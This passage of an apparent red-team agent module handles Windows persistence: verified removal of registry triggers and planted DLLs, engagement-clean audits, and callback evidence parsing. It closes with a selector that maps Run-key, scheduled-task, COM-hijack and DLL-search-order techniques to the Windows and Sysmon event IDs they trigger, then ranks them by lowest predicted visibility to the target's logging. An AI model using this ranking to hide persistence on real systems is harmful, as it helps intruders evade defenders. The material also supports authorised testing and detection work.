        ev.error = 'trigger pre-remove probe failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      cur = cur || { present: false, value: null };
      if (cur.present) {
        const claimed = !!entry || cur.value === plan.trigger.value;
        if (!claimed) {
          ev.state = 'refused-foreign';
          ev.note = 'the trigger location holds a value this agent NEVER installed (no manifest entry, value mismatch) — REFUSED to remove what we did not write; the plant files (if any) stay journaled';
          return ev;
        }
        let post;
        try {
          this.backend.remove(plan.trigger.location);
          post = this.backend.probe(plan.trigger.location);
        } catch (e) {
          ev.state = 'removal-failed';
          if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
          ev.error = 'trigger remove/re-read failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
          return ev;
        }
        if (!post || post.present !== false) {
          ev.state = 'removal-failed';
          if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
          ev.error = 'trigger remove executed but the value is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated; the persistence may STILL FIRE at next logon)';
          return ev;
        }
      }
    }
    const triggerVerified = true; // reached only when the trigger leg verified
    // 2. THE PLANTS — delete ONLY files whose live hash still matches what we planted.
    const recorded = (entry && entry.deep && Array.isArray(entry.deep.files) ? entry.deep.files : []).filter((f) => f.planted === true);
    let filesVerified = true;
    for (const f of recorded) {
      const rec = { role: f.role, path: f.path, sha256: null, present: false, planted: true, removalVerified: null };
      let pre;
      try { pre = this.backend.probeFile(f.path); } catch (e) {
        rec.removalVerified = false; ev.files.push(rec);
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'pre-remove probe failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      pre = pre || { present: false, sha256: null };
      if (pre.present && pre.sha256 !== f.sha256) {
        rec.present = true; rec.sha256 = pre.sha256; ev.files.push(rec);
        ev.state = 'refused-foreign';
        ev.error = 'plant file now holds FOREIGN bytes (hash changed since plant): ' + f.path + ' — REFUSED to delete what we did not write (LOUD; escalate to the operator)';
        return ev;
      }
      if (pre.present) {
        try { this.backend.removeFile(f.path); } catch (e) {
          rec.present = true; rec.sha256 = pre.sha256; ev.files.push(rec);
          ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
          ev.error = 'remove failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate; a still-running copied host holds its files locked — kill it first)';
          return ev;
        }
      }
      let post;
      try { post = this.backend.probeFile(f.path); } catch (e) {
        rec.removalVerified = false; ev.files.push(rec);
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'post-remove re-read failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      rec.removalVerified = !!(post && post.present === false);
      rec.present = !!(post && post.present);
      if (!rec.removalVerified) filesVerified = false;
      ev.files.push(rec);
      if (!rec.removalVerified) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'remove executed but ' + f.path + ' is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)';
        return ev;
      }
    }
    // 3. the plant dir itself goes last (best-effort; a lingering empty dir is reported
    //    by status, never hidden).
    if (typeof this.backend.removeDir === 'function') {
      try { this.backend.removeDir(plan.plantDir); } catch { /* reported by status */ }
    }
    ev.removalVerified = triggerVerified && filesVerified;
    ev.state = 'removed';
    ev.note = (ev.overwriteJournaled ? 'the journaled pre-install trigger value was restored and re-verified; ' : 'the trigger was deleted and verified absent; ') + 'every planted file was deleted and re-read absent — the plant provably holds nothing of ours';
    if (entry) { entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now(); }
    return ev;
  }

  // The deep half of the engagement sweep: re-probe ONE manifest entry's recorded
  // artifact set LIVE. verified === true ONLY with every artifact measured absent
  // (which also closes the entry); anything present or unverifiable stays OPEN.
  _sweepDeepEntry(entry) {
    const closeClean = (note) => {
      entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = entry.removedAt || this._now();
      return { state: 'absent', verified: true, note };
    };
    if (entry.technique === 'comhijack') {
      let cur = null;
      try { cur = this.backend.probe(entry.location); } catch { cur = null; }
      if (cur && cur.present) {
        return { state: entry.state === 'removal-failed' ? 'removal-failed' : (cur.value === (entry.deep.dll || null) ? 'installed' : 'tampered'), verified: false, note: 'STILL PRESENT at the sweep — unverified persistence; the engagement is NOT clean' };
      }
      if (cur && !cur.present) return closeClean('live-verified absent at sweep (measured now, not remembered)');
      return { state: entry.state === 'removal-failed' ? 'removal-failed' : 'unknown', verified: false, note: 'sweep probe failed — removal UNVERIFIED (treated as open: never assume absence)' };
    }
    // dllsearch: trigger + every planted file
    const trigLoc = entry.deep.trigger && entry.deep.trigger.location;
    let anyPresent = false;
    let probeFailed = false;
    if (trigLoc) {
      let trig = null;
      try { trig = this.backend.probe(trigLoc); } catch { trig = null; }
      if (trig === null) probeFailed = true;
      else if (trig.present) anyPresent = true;
    }
    for (const f of (Array.isArray(entry.deep.files) ? entry.deep.files : []).filter((x) => x.planted === true)) {
      let cur = null;
      try { cur = this.backend.probeFile(f.path); } catch { cur = null; }
      if (cur === null || cur === undefined) { probeFailed = true; continue; }
      if (cur.present) anyPresent = true;
    }
    if (anyPresent) {
      return { state: entry.state === 'removal-failed' ? 'removal-failed' : 'installed', verified: false, note: 'STILL PRESENT at the sweep (trigger value and/or planted files) — unverified persistence; the engagement is NOT clean' };
    }
    if (probeFailed) {
      return { state: entry.state === 'removal-failed' ? 'removal-failed' : 'unknown', verified: false, note: 'a sweep probe failed — removal UNVERIFIED (treated as open: never assume absence)' };
    }
    return closeClean('live-verified absent at sweep (trigger + every planted file measured absent now, not remembered)');
  }

  // audit(): the engagement sweep. Every manifest entry is re-probed LIVE (measured
  // now, not remembered): closed = verified removed (or live-verified absent), open =
  // still present / tampered / removal-failed. clean === true ONLY with zero open
  // entries — an engagement with unverified persistence is never clean.
  audit() {
    const entries = [];
    const open = [];
    for (const technique of Object.keys(this.manifest.entries)) {
      const entry = this.manifest.entries[technique];
      // Sweep rows report the BASE technique ('comhijack', not the per-CLSID manifest
      // key 'comhijack-9B1F4D2E') so engagement tracking keys consistently on
      // technique+location; the key handle rides as `key` for deep entries.
      const rec = { technique: entry.deep ? entry.technique : technique, location: entry.location, targetSha256: entry.targetSha256, state: entry.state, removalVerified: entry.removalVerified === true, installedAt: entry.installedAt, removedAt: entry.removedAt || null, note: null };
      if (entry.deep) rec.key = technique;
      if (entry.state === 'removed' && entry.removalVerified === true) {
        entries.push(rec);
        continue;
      }
      if (entry.deep) {
        // DEEP sweep: re-probe the entry's recorded artifact set LIVE — comhijack: the
        // InprocServer32 value; dllsearch: the trigger value + every planted file.
        const sweep = this._sweepDeepEntry(entry);
        rec.state = sweep.state; rec.removalVerified = sweep.verified; rec.note = sweep.note;
        if (!sweep.verified) open.push(rec);
        entries.push(rec);
        continue;
      }
      let cur = null;
      try { cur = this.backend.probe(entry.location); } catch { cur = null; }
      if (cur && cur.present) {
        rec.state = entry.state === 'removal-failed' ? 'removal-failed' : (cur.value === this.target ? 'installed' : 'tampered');
        rec.removalVerified = false;
        rec.note = 'STILL PRESENT at the sweep — unverified persistence; the engagement is NOT clean';
        open.push(rec); entries.push(rec);
      } else if (cur && !cur.present) {
        rec.state = 'absent';
        rec.removalVerified = true;
        rec.note = 'live-verified absent at sweep (measured now, not remembered)';
        entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = entry.removedAt || this._now();
        entries.push(rec);
      } else {
        rec.state = entry.state === 'removal-failed' ? 'removal-failed' : 'unknown';
        rec.removalVerified = false;
        rec.note = 'sweep probe failed — removal UNVERIFIED (treated as open: never assume absence)';
        open.push(rec); entries.push(rec);
      }
    }
    return {
      state: open.length === 0 ? 'clean' : 'unclean',
      clean: open.length === 0,
      entries, open,
      note: open.length === 0
        ? (entries.length === 0 ? 'no persistence was ever installed by this agent (empty manifest) — clean' : 'every installed persistence is verified removed — the engagement persistence footprint is clean')
        : open.length + ' technique(s) still present or removal-unverified — the engagement CANNOT be called clean; run persist-remove and re-audit',
    };
  }
}

// Parse an agent persist result body into the channel-side audit event, or null when
// the body is not parseable persist evidence JSON (a loud-text refusal, truncation, or
// a foreign body — no event is ever fabricated from unverifiable data; the ledger
// preview already carries those). Used by CallbackChannel._intakeResult.
export function parsePersistEvidence(body) {
  let p;
  try { p = JSON.parse(String(body || '')); } catch { return null; }
  if (!p || typeof p !== 'object' || typeof p.op !== 'string') return null;
  if (p.op === 'audit') {
    if (typeof p.clean !== 'boolean' || !Array.isArray(p.entries)) return null;
    return {
      event: 'persist.sweep',
      fields: {
        op: 'audit', state: String(p.state || (p.clean ? 'clean' : 'unclean')), clean: p.clean, pid: p.pid ?? null,
        entries: p.entries.filter((e) => e && typeof e === 'object').map((e) => ({
          technique: String(e.technique || ''), location: e.location || null, state: String(e.state || 'unknown'), removalVerified: e.removalVerified === true,
        })),
        open: Array.isArray(p.open) ? p.open.filter((e) => e && typeof e === 'object').map((e) => ({ technique: String(e.technique || ''), location: e.location || null, state: String(e.state || 'unknown') })) : [],
      },
    };
  }
  const event = p.op === 'install' ? 'persist.installed' : p.op === 'remove' ? null : p.op === 'status' ? 'persist.status' : null;
  if (!p.techniques || typeof p.techniques !== 'object') return null;
  const techniques = {};
  let anyRemovalFailed = false;
  for (const [name, ev] of Object.entries(p.techniques)) {
    if (!ev || typeof ev !== 'object') continue;
    const state = String(ev.state || 'unknown');
    if (state === 'removal-failed') anyRemovalFailed = true;
    const rec = {
      state,
      technique: name,
      location: ev.location || null,
      targetSha256: ev.targetSha256 || null,
      preExisted: ev.preExisted === true,
      overwriteJournaled: ev.overwriteJournaled === true,
      installVerified: ev.installVerified === true,
      removalVerified: ev.removalVerified === true,
      journalRestored: ev.journalRestored === true,
    };
    // DEEP fields ride the audit when present (the accountability trail for the deep
    // tier: which CLSID / which classification, the plant hashes, the trigger model,
    // and the benign resolve-proof outcome). Classic rows are unchanged.
    if (ev.triggerModel != null) rec.triggerModel = String(ev.triggerModel);
    if (ev.clsid != null) rec.clsid = String(ev.clsid);
    if (ev.classification != null) rec.classification = String(ev.classification);
    if (ev.shadow === true) rec.shadow = true;
    if (ev.dllSha256 != null) rec.dllSha256 = String(ev.dllSha256);
    if (ev.hostSha256 != null) rec.hostSha256 = String(ev.hostSha256);
    if (ev.hostSigStatus != null) rec.hostSigStatus = String(ev.hostSigStatus);
    if (ev.hostSigner != null) rec.hostSigner = String(ev.hostSigner);
    if (Array.isArray(ev.files)) {
      rec.files = ev.files.filter((f) => f && typeof f === 'object').map((f) => ({
        role: f.role || null, path: f.path || null, sha256: f.sha256 || null,
        present: f.present === true, planted: f.planted === true, removalVerified: f.removalVerified === true,
      }));
    }
    if (ev.resolveProof && typeof ev.resolveProof === 'object') {
      rec.resolveProof = {
        attempted: ev.resolveProof.attempted === true,
        resolved: ev.resolveProof.resolved === true,
        hresult: ev.resolveProof.hresult != null ? String(ev.resolveProof.hresult) : null,
        childExited: ev.resolveProof.childExited === true,
        childExitCode: typeof ev.resolveProof.childExitCode === 'number' ? ev.resolveProof.childExitCode : null,
      };
    }
    techniques[name] = rec;
  }
  if (Object.keys(techniques).length === 0) return null; // NO EVIDENCE, NO EVENT
  const removeEvent = p.op === 'remove' ? (anyRemovalFailed ? 'persist.remove-failed' : 'persist.removed') : null;
  const finalEvent = event || removeEvent;
  if (!finalEvent) return null;
  return {
    event: finalEvent,
    fields: {
      op: p.op, state: String(p.state || 'unknown'), pid: p.pid ?? null, techniques,
      // THE ESCALATION: a removal that could not verify is never buried — the event type
      // itself flips to persist.remove-failed and carries escalated:true for the operator.
      escalated: finalEvent === 'persist.remove-failed',
    },
  };
}

// The engagement-end sweep, computed over the channel's audit event stream: an
// engagement is 'clean' ONLY when every persist-installed technique (per agent +
// technique + location) was later closed by a verified removal (persist.removed with
// removalVerified, or a persist.sweep reporting clean). Anything else — still
// installed, removal-failed, or simply never revisited — keeps the engagement UNCLEAN.
// Pure: pass the collected onEvent objects in order.
export function assessEngagementClean(events) {
  const open = new Map(); // agentId|technique|location -> { agentId, technique, location, escalated }
  const closed = [];
  // The key's technique component is the BASE technique: deep comhijack rows may carry
  // the per-CLSID handle ('comhijack-9B1F4D2E') as their map key / technique depending
  // on the producer (the audit sweep reports the base; result rows key per-CLSID) — the
  // location already disambiguates coexisting hijacks, so normalize or an install and
  // its verified removal would never meet.
  const key = (agentId, t) => String(agentId) + '|' + baseTechnique(t.technique) + '|' + String(t.location || '');
  for (const e of events || []) {
    if (!e || typeof e !== 'object') continue;
    if (e.type === 'persist.installed' && e.techniques) {
      for (const t of Object.values(e.techniques)) {
        if (t && t.state === 'installed') open.set(key(e.agentId, t), { agentId: e.agentId, technique: t.technique || null, location: t.location || null, escalated: false });
      }
    } else if ((e.type === 'persist.removed' || e.type === 'persist.remove-failed') && e.techniques) {
      for (const [techName, t] of Object.entries(e.techniques)) {
        if (!t) continue;
        const k = key(e.agentId, { technique: techName, location: t.location });
        if (t.removalVerified === true) {
          if (open.delete(k)) closed.push({ agentId: e.agentId, technique: techName, location: t.location || null });
          // a verified removal for something not tracked as open (e.g. pre-existing
          // from an earlier session) is still recorded as closed evidence
          else closed.push({ agentId: e.agentId, technique: techName, location: t.location || null, untracked: true });
        } else {
          const rec = open.get(k) || { agentId: e.agentId, technique: techName, location: t.location || null };
          rec.escalated = true; // removal attempted but NOT verified — the loud loose end
          open.set(k, rec);
        }
      }
    } else if (e.type === 'persist.sweep' && e.clean === true) {
      // A clean sweep from an agent closes everything that agent had open (it re-probed
      // live and found nothing present); an unclean sweep re-asserts its open entries.
      for (const [k, rec] of [...open.entries()]) if (rec.agentId === e.agentId) { open.delete(k); closed.push({ ...rec, via: 'sweep' }); }
    } else if (e.type === 'persist.sweep' && e.clean === false && Array.isArray(e.open)) {
      for (const t of e.open) {
        if (!t) continue;
        const rec = { agentId: e.agentId, technique: t.technique || null, location: t.location || null, escalated: true };
        open.set(key(e.agentId, t), rec);
      }
    }
  }
  const openList = [...open.values()];
  return {
    clean: openList.length === 0,
    open: openList,
    closed,
    note: openList.length === 0
      ? 'no unverified persistence remains — the engagement MAY be called clean'
      : openList.length + ' persistence location(s) are still present or removal-unverified — the engagement CANNOT be called clean (persist-remove + persist-audit until this set is empty)',
  };
}

// ——— EDR-AWARE SELECTION (stage 2) ———
// Every technique carries a STATIC telemetry profile: which event IDs / log sources an
// INSTALL produces. The selector measures the target's posture (tools/persist.mjs:
// which logs answer, the audit-policy subcategories, SACL readability, plus the
// rangehard Defender/ASR state) and ranks classic + deep techniques by PREDICTED
// VISIBILITY — preferring techniques whose install-time signals the CURRENT target
// does not collect (no Sysmon ⇒ registry-only techniques rank higher).
//
// THE HONESTY CONTRACT IS INHERITED VERBATIM: the verdict is 'lower predicted
// visibility against the measured posture', NEVER 'undetectable'. An unmeasured axis
// is 'unknown', never assumed blind.

const SYSMON_LOG = 'Microsoft-Windows-Sysmon/Operational';
export const PERSIST_TELEMETRY = {
  runkey: {
    technique: 'runkey', class: 'classic',
    signals: [
      { axis: 'security4657', log: 'Security', id: 4657, signal: 'registry-value-set', note: 'fires only with Audit-Registry policy AND a SACL on the Run key (neither is default)' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 12, signal: 'registry-key-create-delete' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 13, signal: 'registry-value-set' },
      { axis: 'defenderBehavior', log: 'Defender (behavior)', id: null, signal: 'behavior-persistence-watch', note: 'the Run keys are the most-instrumented user-land persistence locations on a hardened box — a behavior model, not an event id' },
    ],
  },
  schtask: {
    technique: 'schtask', class: 'classic',
    signals: [
      { axis: 'security4698', log: 'Security', id: 4698, signal: 'scheduled-task-created', note: 'fires only with Audit Other Object Access Events (not default)' },
      { axis: 'taskScheduler', log: 'Microsoft-Windows-TaskScheduler/Operational', id: 106, signal: 'task-registered', note: 'the log is enabled by default on client SKUs' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 11, signal: 'file-create', note: 'the task XML lands under C:\\Windows\\System32\\Tasks even for a user-context task' },
      { axis: 'defenderBehavior', log: 'Defender (behavior)', id: null, signal: 'behavior-persistence-watch', note: 'task registration is behavior-watched' },
    ],
  },
  startup: {
    technique: 'startup', class: 'classic',
    signals: [
      { axis: 'sysmon', log: SYSMON_LOG, id: 11, signal: 'file-create', note: '.lnk create under shell:startup' },
      { axis: 'defenderBehavior', log: 'Defender (behavior)', id: null, signal: 'behavior-persistence-watch', note: 'startup-folder drops are watched — below Run-key scrutiny' },
    ],
  },
  comhijack: {
    technique: 'comhijack', class: 'deep',
    // NO 4698, NO TaskScheduler log, NO file-create, NO new process at install — a
    // registry-only write. That is exactly why it ranks quieter when Sysmon is absent.
    signals: [
      { axis: 'security4657', log: 'Security', id: 4657, signal: 'registry-value-set', note: 'fires only with Audit-Registry policy AND a SACL under HKCU\\Software\\Classes (almost never set)' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 12, signal: 'registry-key-create-delete' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 13, signal: 'registry-value-set' },
    ],
  },
  dllsearch: {
    technique: 'dllsearch', class: 'deep',
    signals: [
      { axis: 'sysmon', log: SYSMON_LOG, id: 11, signal: 'file-create', note: 'host-copy + dll-as plant inside the governed dir' },
      { axis: 'security4657', log: 'Security', id: 4657, signal: 'registry-value-set', note: 'the runkey trigger value (a schtask trigger substitutes 4698 + TaskScheduler/106 — ranked as the default runkey trigger)' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 12, signal: 'registry-key-create-delete', note: 'runkey trigger' },
      { axis: 'sysmon', log: SYSMON_LOG, id: 13, signal: 'registry-value-set', note: 'runkey trigger' },
      { axis: 'defenderBehavior', log: 'Defender (behavior)', id: null, signal: 'behavior-persistence-watch', note: 'a signed host launching from a non-standard path is a behavior-analytics surface' },
    ],
  },
};

// The posture the ranker consumes — every axis TRI-STATE (true = measured collecting,
// false = measured NOT collecting, null = UNMEASURED — never assumed blind):
//   sysmon / security / taskScheduler — does the log answer (edrview / selector probe)
//   auditRegistry / auditOtherObjectAccess — the audit-policy subcategories (auditpol /get)
//   saclOnKey — a SACL is set on the watched registry keys (rarely readable unelevated)
//   defenderRtp / defenderBehavior — the rangehard Defender state
//   asr — { readable, block, audit, off } summary (posture context; no technique in
//         this tier is ASR-gated — stated, not scored)
export function postureFromMeasurements({ persistPosture = null, edrview = null, rangehard = null } = {}) {
  const tri = (v) => (v === true ? true : v === false ? false : null);
  const fromLogs = (name) => {
    if (!edrview) return null;
    const checked = Array.isArray(edrview.checked) ? edrview.checked.map(String) : [];
    const unav = Array.isArray(edrview.unavailable) ? edrview.unavailable : [];
    if (checked.includes(name)) return true;
    if (unav.some((l) => String((l && l.log) || l) === name)) return false;
    return null;
  };
  const posture = {
    sysmon: persistPosture && persistPosture.logs ? tri(persistPosture.logs.sysmon) : fromLogs('Microsoft-Windows-Sysmon/Operational'),
    security: persistPosture && persistPosture.logs ? tri(persistPosture.logs.security) : fromLogs('Security'),
    taskScheduler: persistPosture && persistPosture.logs ? tri(persistPosture.logs.taskScheduler) : null,
    auditRegistry: persistPosture && persistPosture.audit ? tri(persistPosture.audit.registry) : null,
    auditOtherObjectAccess: persistPosture && persistPosture.audit ? tri(persistPosture.audit.otherObjectAccess) : null,
    saclOnKey: persistPosture ? tri(persistPosture.saclOnKey) : null,
    defenderRtp: rangehard && rangehard.posture ? (rangehard.posture.rtp === true && rangehard.posture.rtpStatus === true) : null,
    defenderBehavior: rangehard && rangehard.posture ? tri(rangehard.posture.behavior) : null,
    asr: null,
  };
  if (persistPosture && persistPosture.logs) {
    // explicit probe values win where present; edrview fills what the probe did not measure
    if (posture.sysmon === null) posture.sysmon = fromLogs('Microsoft-Windows-Sysmon/Operational');
    if (posture.security === null) posture.security = fromLogs('Security');
  }
  if (rangehard && rangehard.posture && Array.isArray(rangehard.posture.asr)) {
    const asr = rangehard.posture.asr;
    posture.asr = {
      readable: rangehard.posture.asrReadable !== false,
      block: asr.filter((a) => a && a.action === 1).length,
      audit: asr.filter((a) => a && a.action === 2).length,
      other: asr.filter((a) => a && a.action !== 1 && a.action !== 2).length,
    };
  }
  return posture;
}

// Resolve ONE signal against the posture: 'collected' | 'not-collected' | 'unknown'.
function resolveSignal(sig, posture) {
  const tri = (v) => (v === true ? 'collected' : v === false ? 'not-collected' : 'unknown');
  switch (sig.axis) {
    case 'sysmon': return tri(posture.sysmon);
    case 'taskScheduler': return tri(posture.taskScheduler);
    case 'defenderBehavior':
      if (posture.defenderRtp === false) return 'not-collected'; // the whole sensor is off
      return tri(posture.defenderBehavior);
    case 'security4698':
      if (posture.security === false) return 'not-collected';
      if (posture.security !== true) return 'unknown';
      return tri(posture.auditOtherObjectAccess);
    case 'security4657':
      if (posture.security === false) return 'not-collected';
      if (posture.security !== true) return 'unknown';
      if (posture.auditRegistry === false || posture.saclOnKey === false) return 'not-collected';
      return posture.auditRegistry === true && posture.saclOnKey === true ? 'collected' : 'unknown';
    default: return 'unknown';
  }
}

// THE RANKER. Pure. Returns the technique set (classic + deep) ranked by predicted
// install-time visibility against the MEASURED posture: primary key = how many of the
// technique's signals the posture provably collects (ascending); secondary = how many
// axes are UNMEASURED (ascending — a technique ranking on unmeasured axes is a weaker
// claim, stated per row). Every row carries its trigger model + the honesty phrasing.
export function rankPersistTechniques(posture, { techniques = PERSIST_ALL_TECHNIQUES } = {}) {
  const p = posture || {};
  const rows = [];
  for (const t of techniques) {
    const profile = PERSIST_TELEMETRY[t];
    if (!profile) continue;
    const collected = [];
    const notCollected = [];
    const unknown = [];
    for (const sig of profile.signals) {
      const r = resolveSignal(sig, p);
      const rec = { log: sig.log, id: sig.id, signal: sig.signal, resolution: r, note: sig.note || null };
      if (r === 'collected') collected.push(rec);
      else if (r === 'not-collected') notCollected.push(rec);
      else unknown.push(rec);
    }
    rows.push({
      technique: t, class: profile.class,
      score: collected.length,
      collected, notCollected, unknown,
      triggerModel: PERSIST_TRIGGER_MODELS[t],
      verdict: collected.length === 0
        ? 'no install-time signal of this technique is collected by the measured posture'
        : collected.length + ' of ' + profile.signals.length + ' install-time signals are collected by the measured posture',
      note: (unknown.length ? 'ranking is PARTIAL: ' + unknown.length + ' signal axis/axes unmeasured (unknown is never assumed blind). ' : '')
        + 'lower predicted visibility against the measured posture is NOT undetectability — unmeasured sensors, SACLs outside the read, ETW providers, and EDR analytics outside the event logs may still record the install.',
    });
  }
  rows.sort((a, b) => a.score - b.score || a.unknown.length - b.unknown.length || a.technique.localeCompare(b.technique));
  rows.forEach((r, i) => { r.rank = i + 1; });
  return {
    posture: p,
    ranking: rows,
    recommended: rows.length ? rows[0].technique : null,
    note: rows.length
      ? 'ranked by predicted install-time visibility against the MEASURED posture — \'' + rows[0].technique + '\' currently has the lowest predicted visibility (' + rows[0].score + ' collected signal(s)). This is a visibility ranking, NEVER an undetectability claim.'
      : 'no techniques ranked (empty technique set)',
  };
}
